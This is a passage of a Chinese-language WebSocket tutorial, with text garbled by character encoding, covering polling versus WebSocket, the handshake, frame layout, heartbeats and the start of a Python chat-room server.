class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¼ ç»ŸHTTPçš„é—®é¢˜ï¼š<br><br><span class="hljs-bullet">1.</span> å•å‘é€šä¿¡<br>   å®¢æˆ·ç«¯ â†’ è¯·æ±‚ â†’ æœåŠ¡å™¨<br>   å®¢æˆ·ç«¯ â† å“åº” â† æœåŠ¡å™¨<br><br>   é—®é¢˜ï¼šæœåŠ¡å™¨æ— æ³•ä¸»åŠ¨æ¨é€æ•°æ®<br><br><span class="hljs-bullet">2.</span> è½®è¯¢æ–¹å¼æ•ˆç‡ä½<br><br>   çŸ­è½®è¯¢ï¼ˆPollingï¼‰ï¼š<br>   å®¢æˆ·ç«¯æ¯éš”ä¸€æ®µæ—¶é—´å‘é€è¯·æ±‚<br>   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>   â”‚ å®¢æˆ·ç«¯ â†’ æœ‰æ–°æ¶ˆæ¯å—ï¼Ÿ           â”‚<br>   â”‚ æœåŠ¡å™¨ â† æ²¡æœ‰                   â”‚<br>   â”‚ (ç­‰å¾…1ç§’)                       â”‚<br>   â”‚ å®¢æˆ·ç«¯ â†’ æœ‰æ–°æ¶ˆæ¯å—ï¼Ÿ           â”‚<br>   â”‚ æœåŠ¡å™¨ â† æ²¡æœ‰                   â”‚<br>   â”‚ (ç­‰å¾…1ç§’)                       â”‚<br>   â”‚ å®¢æˆ·ç«¯ â†’ æœ‰æ–°æ¶ˆæ¯å—ï¼Ÿ           â”‚<br>   â”‚ æœåŠ¡å™¨ â† æœ‰ï¼è¿™æ˜¯æ¶ˆæ¯           â”‚<br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>   ç¼ºç‚¹ï¼š<br><span class="hljs-bullet">   -</span> å¤§é‡æ— ç”¨è¯·æ±‚<br><span class="hljs-bullet">   -</span> èµ„æºæµªè´¹<br><span class="hljs-bullet">   -</span> å®æ—¶æ€§å·®<br><br>   é•¿è½®è¯¢ï¼ˆLong Pollingï¼‰ï¼š<br>   å®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨holdä½è¿æ¥<br>   æœ‰æ¶ˆæ¯æ—¶æ‰è¿”å›<br>   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>   â”‚ å®¢æˆ·ç«¯ â†’ æœ‰æ–°æ¶ˆæ¯å—ï¼Ÿ           â”‚<br>   â”‚ (æœåŠ¡å™¨ç­‰å¾…...)                 â”‚<br>   â”‚ (æœ‰æ–°æ¶ˆæ¯!)                     â”‚<br>   â”‚ æœåŠ¡å™¨ â† æœ‰ï¼è¿™æ˜¯æ¶ˆæ¯           â”‚<br>   â”‚ å®¢æˆ·ç«¯ â†’ æœ‰æ–°æ¶ˆæ¯å—ï¼Ÿ(ç«‹å³é‡è¿) â”‚<br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>   æ”¹è¿›ï¼šå®æ—¶æ€§å¥½<br>   ç¼ºç‚¹ï¼šä»éœ€é¢‘ç¹å»ºç«‹è¿æ¥<br><br>ç”Ÿæ´»åŒ–ç±»æ¯”ï¼š<br>HTTPè½®è¯¢ = ä¸åœé—®ï¼š&quot;å¿«é€’åˆ°äº†å—ï¼Ÿ&quot;<br>WebSocket = å¿«é€’å‘˜ï¼š&quot; åˆ°äº†æˆ‘å°±å‘Šè¯‰ä½ &quot;<br></code></pre></td></tr></table></figure><hr><h2 id="2-WebSocketåè®®è¯¦è§£"><a href="#2-WebSocketåè®®è¯¦è§£" class="headerlink" title="2. WebSocketåè®®è¯¦è§£"></a>2. WebSocketåè®®è¯¦è§£</h2><h3 id="2-1-WebSocketç‰¹ç‚¹"><a href="#2-1-WebSocketç‰¹ç‚¹" class="headerlink" title="2.1 WebSocketç‰¹ç‚¹"></a>2.1 WebSocketç‰¹ç‚¹</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">WebSocketåè®®ç‰¹æ€§ï¼š<br><br><span class="hljs-bullet">1.</span> å…¨åŒå·¥é€šä¿¡<br>   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>   â”‚  å®¢æˆ·ç«¯ â†â”€â”€æ•°æ®â”€â”€â†’ æœåŠ¡å™¨    â”‚<br>   â”‚         åŒå‘å®æ—¶é€šä¿¡          â”‚<br>   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><span class="hljs-bullet">2.</span> åŸºäºTCP<br><span class="hljs-bullet">   -</span> å¯é ä¼ è¾“<br><span class="hljs-bullet">   -</span> æœ‰åºäº¤ä»˜<br><span class="hljs-bullet">   -</span> æµé‡æ§åˆ¶<br><br><span class="hljs-bullet">3.</span> ä½å¼€é”€<br><span class="hljs-bullet">   -</span> æ¡æ‰‹åæ— éœ€HTTPå¤´<br><span class="hljs-bullet">   -</span> å¸§å¼€é”€å°ï¼ˆ2-14å­—èŠ‚ï¼‰<br><span class="hljs-bullet">   -</span> é€‚åˆé«˜é¢‘æ¶ˆæ¯<br><br><span class="hljs-bullet">4.</span> ä¿æŒè¿æ¥<br><span class="hljs-bullet">   -</span> é•¿è¿æ¥<br><span class="hljs-bullet">   -</span> æ— éœ€é‡å¤å»ºç«‹<br><br><span class="hljs-bullet">5.</span> æ”¯æŒæ–‡æœ¬å’ŒäºŒè¿›åˆ¶<br><span class="hljs-bullet">   -</span> æ–‡æœ¬å¸§ï¼šUTF-8ç¼–ç <br><span class="hljs-bullet">   -</span> äºŒè¿›åˆ¶å¸§ï¼šä»»æ„æ•°æ®<br><br>åè®®æ ‡è¯†ï¼š<br>ws://example.com/socket   # éåŠ å¯†<br>wss://example.com/socket  # TLSåŠ å¯†ï¼ˆæ¨èï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-2-WebSocketæ¡æ‰‹"><a href="#2-2-WebSocketæ¡æ‰‹" class="headerlink" title="2.2 WebSocketæ¡æ‰‹"></a>2.2 WebSocketæ¡æ‰‹</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs nix">WebSocketæ¡æ‰‹è¿‡ç¨‹ï¼š<br><br>å®¢æˆ·ç«¯è¯·æ±‚ï¼ˆHTTP Upgradeï¼‰ï¼š<br>GET <span class="hljs-symbol">/chat</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> example.com<br><span class="hljs-params">Upgrade:</span> websocket<br><span class="hljs-params">Connection:</span> Upgrade<br><span class="hljs-params">Sec-WebSocket-Key:</span> dGhlIHNhbXBsZSBub25jZQ<span class="hljs-operator">==</span><br><span class="hljs-params">Sec-WebSocket-Version:</span> <span class="hljs-number">13</span><br><br>å…³é”®å¤´éƒ¨ï¼š<br><span class="hljs-operator">-</span> <span class="hljs-params">Upgrade:</span> websocket         <span class="hljs-comment"># è¯·æ±‚å‡çº§åˆ°WebSocket</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Connection:</span> Upgrade        <span class="hljs-comment"># è¿æ¥å‡çº§</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Sec-WebSocket-Key:</span> xxx     <span class="hljs-comment"># éšæœºå¯†é’¥ï¼ˆBase64ï¼‰</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Sec-WebSocket-Version:</span> <span class="hljs-number">13</span>  <span class="hljs-comment"># WebSocketç‰ˆæœ¬</span><br><br>æœåŠ¡å™¨å“åº”ï¼š<br>HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">101</span> Switching Protocols<br><span class="hljs-params">Upgrade:</span> websocket<br><span class="hljs-params">Connection:</span> Upgrade<br><span class="hljs-params">Sec-WebSocket-Accept:</span> s3pPLMBiTxaQ9kYGzzhZRbK<span class="hljs-operator">+</span>xOo<span class="hljs-operator">=</span><br><br>å…³é”®å¤´éƒ¨ï¼š<br><span class="hljs-operator">-</span> <span class="hljs-number">101</span> Switching Protocols    <span class="hljs-comment"># åˆ‡æ¢åè®®</span><br><span class="hljs-operator">-</span> <span class="hljs-params">Sec-WebSocket-Accept:</span> xxx  <span class="hljs-comment"># ç¡®è®¤å¯†é’¥</span><br><br>Acceptè®¡ç®—æ–¹æ³•ï¼š<br><span class="hljs-number">1</span>. æ‹¼æ¥ï¼šSec-WebSocket-Key <span class="hljs-operator">+</span> <span class="hljs-string">&quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span><br><span class="hljs-number">2</span>. SHA-<span class="hljs-number">1</span>å“ˆå¸Œ<br><span class="hljs-number">3</span>. Base64ç¼–ç <br><br>æ¡æ‰‹å®Œæˆåï¼š<br><span class="hljs-operator">-</span> HTTPåè®®å‡çº§ä¸ºWebSocket<br><span class="hljs-operator">-</span> å¼€å§‹ä½¿ç”¨WebSocketå¸§ä¼ è¾“æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="2-3-WebSocketå¸§æ ¼å¼"><a href="#2-3-WebSocketå¸§æ ¼å¼" class="headerlink" title="2.3 WebSocketå¸§æ ¼å¼"></a>2.3 WebSocketå¸§æ ¼å¼</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">WebSocketæ•°æ®å¸§ç»“æ„ï¼š<br><br> 0                   1                   2                   3<br> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>+-+-+-+-+-------+-+-------------+-------------------------------+<br>|<span class="hljs-string">F</span>|<span class="hljs-string">R</span>|<span class="hljs-string">R</span>|<span class="hljs-string">R</span>|<span class="hljs-string"> opcode</span>|<span class="hljs-string">M</span>|<span class="hljs-string"> Payload len </span>|<span class="hljs-string">    Extended payload length    </span>|<br>|<span class="hljs-string">I</span>|<span class="hljs-string">S</span>|<span class="hljs-string">S</span>|<span class="hljs-string">S</span>|<span class="hljs-string">  (4)  </span>|<span class="hljs-string">A</span>|<span class="hljs-string">     (7)     </span>|<span class="hljs-string">             (16/64)           </span>|<br>|<span class="hljs-string">N</span>|<span class="hljs-string">V</span>|<span class="hljs-string">V</span>|<span class="hljs-string">V</span>|<span class="hljs-string">       </span>|<span class="hljs-string">S</span>|<span class="hljs-string">             </span>|<span class="hljs-string">   (if payload len==126/127)   </span>|<br>|<span class="hljs-string"> </span>|<span class="hljs-string">1</span>|<span class="hljs-string">2</span>|<span class="hljs-string">3</span>|<span class="hljs-string">       </span>|<span class="hljs-string">K</span>|<span class="hljs-string">             </span>|<span class="hljs-string">                               </span>|<br>+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +<br>|<span class="hljs-string">     Extended payload length continued, if payload len == 127  </span>|<br>+ - - - - - - - - - - - - - - - +-------------------------------+<br>|<span class="hljs-string">                               </span>|<span class="hljs-string">Masking-key, if MASK set to 1  </span>|<br>+-------------------------------+-------------------------------+<br>|<span class="hljs-string"> Masking-key (continued)       </span>|<span class="hljs-string">          Payload Data         </span>|<br>+-------------------------------- - - - - - - - - - - - - - - - +<br>:                     Payload Data continued ...                :<br>+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +<br>|<span class="hljs-string">                     Payload Data continued ...                </span>|<br>+---------------------------------------------------------------+<br><br>å­—æ®µè¯´æ˜ï¼š<br><br>1. FIN (1 bit)<br>   - 1: æœ€åä¸€å¸§<br>   - 0: åç»­è¿˜æœ‰å¸§<br><br>2. RSV1, RSV2, RSV3 (å„1 bit)<br>   - ä¿ç•™ä½ï¼Œé€šå¸¸ä¸º0<br><br>3. Opcode (4 bits)<br>   - 0x0: ç»§ç»­å¸§<br>   - 0x1: æ–‡æœ¬å¸§<br>   - 0x2: äºŒè¿›åˆ¶å¸§<br>   - 0x8: å…³é—­è¿æ¥<br>   - 0x9: Ping<br>   - 0xA: Pong<br><br>4. MASK (1 bit)<br>   - 1: è´Ÿè½½å·²æ©ç ï¼ˆå®¢æˆ·ç«¯å¿…é¡»è®¾ç½®ï¼‰<br>   - 0: è´Ÿè½½æœªæ©ç <br><br>5. Payload length (7/7+16/7+64 bits)<br>   - 0-125: å®é™…é•¿åº¦<br>   - 126: åç»­16ä½è¡¨ç¤ºé•¿åº¦<br>   - 127: åç»­64ä½è¡¨ç¤ºé•¿åº¦<br><br>6. Masking-key (0 or 4 bytes)<br>   - æ©ç å¯†é’¥ï¼ˆä»…MASK=1æ—¶å­˜åœ¨ï¼‰<br><br>7. Payload Data<br>   - å®é™…æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="2-4-å¿ƒè·³æœºåˆ¶"><a href="#2-4-å¿ƒè·³æœºåˆ¶" class="headerlink" title="2.4 å¿ƒè·³æœºåˆ¶"></a>2.4 å¿ƒè·³æœºåˆ¶</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">WebSocketå¿ƒè·³ï¼ˆPing/Pongï¼‰ï¼š<br><br>ä½œç”¨ï¼š<br><span class="hljs-number">1.</span> ä¿æŒè¿æ¥æ´»è·ƒ<br><span class="hljs-number">2.</span> æ£€æµ‹è¿æ¥æ˜¯å¦æ–­å¼€<br><span class="hljs-number">3.</span> é˜²æ­¢ä¸­é—´ä»£ç†è¶…æ—¶å…³é—­<br><br>Ping/Pongæœºåˆ¶ï¼š<br>å®¢æˆ·ç«¯ â†’ Ping â†’ æœåŠ¡å™¨<br>å®¢æˆ·ç«¯ â† Pong â† æœåŠ¡å™¨<br><br>å®ç°æ–¹å¼ï¼š<br><span class="hljs-comment"># å®¢æˆ·ç«¯</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (ws.readyState === WebSocket.OPEN) &#123;<br>        ws.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;type: <span class="hljs-string">&#x27;ping&#x27;</span>&#125;));<br>    &#125;<br>&#125;, <span class="hljs-number">30000</span>);  <span class="hljs-regexp">//</span> æ¯<span class="hljs-number">30</span>ç§’å‘é€ä¸€æ¬¡<br><br><span class="hljs-comment"># æœåŠ¡å™¨</span><br><span class="hljs-keyword">if</span> (message.type === <span class="hljs-string">&#x27;ping&#x27;</span>) &#123;<br>    ws.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;type: <span class="hljs-string">&#x27;pong&#x27;</span>&#125;));<br>&#125;<br><br>è¶…æ—¶æ£€æµ‹ï¼š<br>let pongReceived = <span class="hljs-literal">true</span>;<br><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!pongReceived) &#123;<br>        <span class="hljs-regexp">//</span> è¶…æ—¶ï¼Œå…³é—­è¿æ¥<br>        ws.close();<br>    &#125;<br>    pongReceived = <span class="hljs-literal">false</span>;<br>    ws.ping();<br>&#125;, <span class="hljs-number">30000</span>);<br><br>ws.<span class="hljs-literal">on</span>(<span class="hljs-string">&#x27;pong&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    pongReceived = <span class="hljs-literal">true</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="3-å®æˆ˜é¡¹ç›®ï¼šWebSocketæœåŠ¡å™¨"><a href="#3-å®æˆ˜é¡¹ç›®ï¼šWebSocketæœåŠ¡å™¨" class="headerlink" title="3. å®æˆ˜é¡¹ç›®ï¼šWebSocketæœåŠ¡å™¨"></a>3. å®æˆ˜é¡¹ç›®ï¼šWebSocketæœåŠ¡å™¨</h2><h3 id="3-1-ä»£ç å®ç°"><a href="#3-1-ä»£ç å®ç°" class="headerlink" title="3.1 ä»£ç å®ç°"></a>3.1 ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day31_websocket_server.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šWebSocketæœåŠ¡å™¨å®ç°</span><br><span class="hljs-comment"># éœ€è¦å®‰è£…ï¼špip install websockets</span><br><br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> websockets<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># å­˜å‚¨æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯</span><br>connected_clients = <span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client</span>(<span class="hljs-params">websocket, path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¤„ç†å®¢æˆ·ç«¯è¿æ¥</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        websocket: WebSocketè¿æ¥å¯¹è±¡</span><br><span class="hljs-string">        path: è¿æ¥è·¯å¾„</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># æ·»åŠ åˆ°è¿æ¥é›†åˆ</span><br>    connected_clients.add(websocket)<br>    client_id = <span class="hljs-built_in">id</span>(websocket)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;datetime.now()&#125;</span>] å®¢æˆ·ç«¯è¿æ¥: <span class="hljs-subst">&#123;client_id&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å½“å‰åœ¨çº¿: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(connected_clients)&#125;</span> äºº&quot;</span>)<br><br>    <span class="hljs-comment"># å‘é€æ¬¢è¿æ¶ˆæ¯</span><br>    welcome_msg = &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;æ¬¢è¿åŠ å…¥èŠå¤©å®¤ï¼å½“å‰åœ¨çº¿ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(connected_clients)&#125;</span> äºº&quot;</span>,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>    &#125;<br>    <span class="hljs-keyword">await</span> websocket.send(json.dumps(welcome_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>    <span class="hljs-comment"># å¹¿æ’­ç”¨æˆ·åŠ å…¥æ¶ˆæ¯</span><br>    join_msg = &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user_join&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;ç”¨æˆ· <span class="hljs-subst">&#123;client_id&#125;</span> åŠ å…¥äº†èŠå¤©å®¤&quot;</span>,<br>        <span class="hljs-string">&quot;online_count&quot;</span>: <span class="hljs-built_in">len</span>(connected_clients),<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>    &#125;<br>    <span class="hljs-keyword">await</span> broadcast(json.dumps(join_msg, ensure_ascii=<span class="hljs-literal">False</span>), exclude=websocket)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># æŒç»­æ¥æ”¶æ¶ˆæ¯</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> message <span class="hljs-keyword">in</span> websocket:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;datetime.now()&#125;</span>] æ”¶åˆ°æ¶ˆæ¯: <span class="hljs-subst">&#123;message&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># è§£æJSONæ¶ˆæ¯</span><br>                data = json.loads(message)<br><br>                <span class="hljs-comment"># å¤„ç†ä¸åŒç±»å‹çš„æ¶ˆæ¯</span><br>                <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;ping&#x27;</span>:<br>                    <span class="hljs-comment"># å¿ƒè·³å“åº”</span><br>                    pong_msg = &#123;<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;pong&quot;</span>,<br>                        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                    &#125;<br>                    <span class="hljs-keyword">await</span> websocket.send(json.dumps(pong_msg))<br><br>                <span class="hljs-keyword">elif</span> data.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;chat&#x27;</span>:<br>                    <span class="hljs-comment"># èŠå¤©æ¶ˆæ¯ï¼Œå¹¿æ’­ç»™æ‰€æœ‰äºº</span><br>                    chat_msg = &#123;<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;chat&quot;</span>,<br>                        <span class="hljs-string">&quot;from&quot;</span>: client_id,<br>                        <span class="hljs-string">&quot;message&quot;</span>: data.get(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>),<br>                        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                    &#125;<br>                    <span class="hljs-keyword">await</span> broadcast(json.dumps(chat_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>            <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>                <span class="hljs-comment"># éJSONæ¶ˆæ¯ï¼Œç›´æ¥å¹¿æ’­</span><br>                text_msg = &#123;<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;chat&quot;</span>,<br>                    <span class="hljs-string">&quot;from&quot;</span>: client_id,<br>                    <span class="hljs-string">&quot;message&quot;</span>: message,<br>                    <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                &#125;<br>                <span class="hljs-keyword">await</span> broadcast(json.dumps(text_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>    <span class="hljs-keyword">except</span> websockets.exceptions.ConnectionClosed:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;datetime.now()&#125;</span>] 